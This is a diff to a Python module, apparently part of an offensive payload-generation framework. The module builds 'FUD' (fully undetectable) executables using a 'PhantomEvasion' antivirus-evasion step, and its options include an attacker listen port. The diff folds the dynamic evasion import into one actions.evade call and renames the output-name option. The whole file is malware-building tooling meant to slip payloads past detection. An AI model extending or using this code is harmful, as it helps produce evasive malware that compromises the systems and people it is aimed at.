@@ -1,7 +1,7 @@
 
 from core import utils, controller
 from libs import actions
-import os, random, importlib
+import os, random
 
 class Payload(controller.Module):
 	__info__ = {
@@ -28,7 +28,7 @@ class Payload(controller.Module):
 	lport = controller.Options('4444', "Attacker's listen port")
 	evasion_tech = controller.Options("PhantomEvasion", "FUD technology")
 	evasion_method = controller.Options("MHA", 'Evasion method. Usage :show evasions')
-	exec_name = controller.Options('evil', "Name of executable file in source code")
+	output_name = controller.Options('evil', "Name of output executable file")
 
 	def run(self):
 		try:
@@ -54,15 +54,12 @@ class Payload(controller.Module):
 		utils.printf("Generating FUD payload", 'warn')
 		try:
 			data = actions.getout(src_output)
-			evade_method = "{}_mathinject_{}".format(self.evasion_method, self.platform)
-			evade_tech = importlib.import_module('evasion.{}'.format(self.evasion_tech))
-			evade_run = getattr(evade_tech, evade_method)(data, self.exec_name)
-			data = evade_run.run()
+			data = actions.evade(self.platform, self.evasion_tech, self.evasion_method, data, self.output_name)
 			actions.writeout(data, src_output)
 			utils.printf("Generating FUD payload completed", 'good')
 		except:
 			utils.printf("Error while generating FUD payload", 'bad')
 			return ''
 		utils.printf("Building executable file", 'warn')
-		actions.build_exec(self.platform, self.architecture, src_output, 'output/')
+		actions.build_exec(self.platform, self.architecture, src_output, 'output/', self.output_name)
 		utils.printf("Build completed", 'good')
